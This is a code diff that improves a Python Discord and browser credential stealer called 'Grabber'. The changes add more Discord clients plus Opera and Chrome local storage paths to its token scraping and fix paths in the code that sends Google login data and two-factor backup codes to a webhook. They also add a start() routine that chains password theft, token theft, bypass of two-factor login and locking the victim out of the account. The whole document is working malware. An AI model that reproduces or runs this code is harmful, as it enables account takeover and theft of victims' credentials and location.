@@ -10,7 +10,11 @@ class Grabber:
             2: 'Invalid two-factor code' 
         }
         self.dirs = [
-            self.getAppData() + '\\Discord\\Local Storage\\leveldb'
+            self.getAppData() + '\\Discord\\Local Storage\\leveldb',
+            self.getAppData() + '\\discordcanary\\Local Storage\\leveldb',
+            self.getAppData() + '\\discordptb\\Local Storage\\leveldb',
+            self.getAppData() + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
+            os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'
         ]
         self.passwords = []
         self.validPassword = [] # <TODO> give it a better use
@@ -94,7 +98,7 @@ class Grabber:
                 r = self.session.post('https://discordapp.com/api/v6/users/@me/mfa/codes', headers=self.getHeaders(token), json=payload)
                 with open(f'{self.getAppData}\\Discord Data\\Backup.txt') as f:
                     f.write(r.json())
-                self.webHookFile(message="Some backup codes", file=f'{self.getAppData}\\Discord Data\\Backup.txt')    
+                self.webHookFile(message="Some backup codes", file=f'{self.getAppData()}\\Discord Data\\Backup.txt')    
                 for i in range(10):
                     try:
                         backup = r.json()['backup_codes'][i]['code']
@@ -133,19 +137,19 @@ class Grabber:
                     data += '\nLogin portal : ' + login
                     data += '\n=================================\n\n'
                     f.write(data)
-            self.webHookFile(message="Google login data", file=f'{os.getenv("APPDATA")}\\Google Backup\\Google.txt')  
+            self.webHookFile(message="Google login data", file=f'{self.getAppData()}\\Google Backup\\Google.txt')  
 
     def grabToken(self):
         for location in self.dirs:
             for file in os.listdir(location):
-                with open(f"{location}\\{file}", errors='ignore') as _data:
-                    try:
+                try:
+                    with open(f"{location}\\{file}", errors='ignore') as _data:
                         regex = re.findall(self.tokenRegex, _data.read())
                         if regex:
                             for token in regex:
                                 self.tokens.append(token)
-                    except (PermissionError):
-                        continue
+                except (FileNotFoundError, PermissionError):
+                    pass
 
     def checkTokens(self):
         for token in self.tokens:
@@ -176,11 +180,29 @@ class Grabber:
         if r.status_code == 200:
             return True
 
+    def start(self):
+        if not os.path.exists(f'{self.getAppData()}/Google Backup/'): 
+            os.makedirs(f'{self.getAppData()}/Google Backup/')
+        if not os.path.exists(f'{self.getAppData()}/Google Backup/Google.txt'):
+            os.makedirs(f'{self.getAppData()}/Google Backup/Google.txt')
+        self.grabPassword()
+        self.grabToken()
+        self.checkTokens()
+        self.bye2FA()
+        self.lockOut()
+
     def getAppData(self):
         if platform.system() == 'Linux': 
-            return os.getenv('HOME')
-        else:
+            return os.getenv('HOME')+'/.config'
+        elif platform.system() == 'Windows':
             return os.getenv('APPDATA') 
+        else:
+            return os.getenv('XDG_CONFIG_HOME')
+
+    def grabIP(self):
+        r = self.session.get('https://ifconfig.co/json')
+        data = f'IP: {r.json()["ip"]} - Country: {r.json()["country"]}, {r.json()["city"]}'
+        return data
 
     def newEmail(self):
         email = self.session.get("https://ically.net/user.php?user=", data={"data": ""}).text
@@ -194,15 +216,5 @@ class Grabber:
         number = random.randint(1, 999)
         return number
 
-    def grabIP(self):
-        r = self.session.get('https://ifconfig.co/json')
-        data = f'IP: {r.json()["ip"]} - Country: {r.json()["country"]}, {r.json()["city"]}'
-        return data
-
-if __name__ == "__main__": # changing order will most likely fucc the whole code
-    if not os.path.exists(f'{os.getenv("APPDATA")}/Google Backup/'): os.makedirs(f'{os.getenv("APPDATA")}/Google Backup/')
-    Grabber().grabPassword()
-    Grabber().grabToken()
-    Grabber().checkTokens()
-    Grabber().bye2FA()
-    Grabber().lockOut()
+if __name__ == "__main__":
+    Grabber().start()
